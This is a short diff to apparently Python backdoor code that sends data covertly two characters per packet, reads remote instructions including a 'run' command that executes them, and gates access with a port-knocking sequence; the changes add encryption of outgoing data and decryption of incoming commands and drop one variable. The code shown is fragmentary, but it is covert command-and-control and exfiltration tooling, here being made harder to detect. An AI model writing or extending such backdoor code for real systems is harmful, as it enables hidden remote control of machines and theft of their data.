@@ -84,6 +84,7 @@ def send_end_msg(dest, output_type, sport):
 
 
 def send_data(msg, ip, sport, output_type):
+	msg = encrypt_val(msg)
 	for char1, char2 in zip(msg[0::2], msg[1::2]):
 		# delay_sleep()
 		send(data_packet(ip, sport, char1, char2))
@@ -133,6 +134,7 @@ def watch_dir(packet, path):
 
 
 def read_inst(packet, command):
+	command = decrypt_val(command)
 	cmd = command.split(' ', 1)
 	if(cmd[0] == "run"):
 		run_cmd(packet, cmd[1])
@@ -165,7 +167,6 @@ def port_knock_auth(packet):
 	dport = packet[2].dport
 	sport = packet[2].sport
 	access = [2525, 14156, 6364]
-	dc = 4242
 
 	# If the connecting IP has connected before
 	if(ip in CONN_IPS):
